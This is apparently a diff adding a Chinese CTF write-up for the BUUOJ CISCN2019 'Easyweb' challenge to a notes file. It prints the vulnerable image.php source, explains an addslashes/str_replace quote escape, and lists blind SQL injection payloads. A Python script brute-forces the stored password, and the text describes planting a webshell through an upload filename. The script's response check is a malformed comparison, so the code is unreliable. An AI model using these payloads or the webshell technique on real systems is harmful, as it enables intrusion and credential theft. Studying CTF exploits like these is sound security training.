@@ -8871,7 +8871,100 @@ payload：
 
 ![image-20240509131856646](CTF.assets/image-20240509131856646.png)
 
+## BUUOJ [CISCN2019 总决赛 Day2 Web1]Easyweb
 
+进来可以看到一个登录页面，尝试了一下SLQ注入无果，发现了一个`robots.txt`文件，成功下载`image.php.bak`，如下：
+
+```php
+<﻿?php
+include "config.php";
+
+$id=isset($_GET["id"])?$_GET["id"]:"1";
+$path=isset($_GET["path"])?$_GET["path"]:"";
+
+$id=addslashes($id);
+$path=addslashes($path);
+
+$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
+$path=str_replace(array("\\0","%00","\\'","'"),"",$path);
+
+$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
+$row=mysqli_fetch_array($result,MYSQLI_ASSOC);
+
+$path="./" . $row["path"];
+header("Content-Type: image/jpeg");
+readfile($path);
+```
+
+这里有一个`addslashes`和`str_replace`使用不当漏洞，输入`\0`最后成功得到`\`，这时就可以做一个单引号逃逸
+
+```php
+<?php
+$path = '\0';
+$path = addslashes($path);			# addslashes 转译为：\\0
+var_dump($path);
+$path = str_replace(array("\\0", "%00", "\\'", "'"), "", $path);		# str_replace 吃掉 \0
+var_dump($path);				# 剩下：\
+```
+
+```
+select * from images where id='\' or path='sql injection--+'
+```
+
+剩下就是上脚本爆破即可；这里有一个坑点，就是不能输入单引号，所以在爆字段的时候`users`要拿16进制表示：`0x7573657273`
+
+```
+爆表：||ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))>100--+
+
+爆字段：||ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 1,1),{},1))<{}--+
+
+爆值：||ascii(substring((select username from users),1,1))<100%23
+```
+
+```py
+import requests
+import time
+
+base_url = 'http://54694385-28d6-49e1-81cf-fc936cbedc28.node5.buuoj.cn:81/image.php'
+
+database_name = ''
+for i in range(1, 30):
+    max_value = 123
+    min_value = 33
+    mid_value = (max_value + min_value) // 2
+    while max_value - min_value != 1:
+        payload1 = '?id=\\0&path=||ascii(substring((select password from users),{},1))<{}%23'.format(i, mid_value)
+        req = requests.get(base_url + payload1)
+
+        if req.status_code != 200:
+            time.sleep(0.8)
+            continue
+
+        # False min_value -; True Max_value -
+        if len(req.text) > 0 in req.content:
+            max_value = mid_value
+        else:
+            min_value = mid_value
+
+        mid_value = (max_value + min_value) // 2
+
+    database_name += chr(mid_value)
+    print(f"[database_name] {database_name}")
+```
+
+最后成功拿到用户名密码，登录即可
+
+![image-20240510145032031](CTF.assets/image-20240510145032031.png)
+
+上传文件后访问给出的链接如下，可以看到这里会把文件名包含进来，那么只要在文件名处写入一句话木马即可
+
+![image-20240510145055818](CTF.assets/image-20240510145055818.png)
+
+![image-20240510145129335](CTF.assets/image-20240510145129335.png)
+
+
+
+最后蚁剑连接
 
 # Misc
 
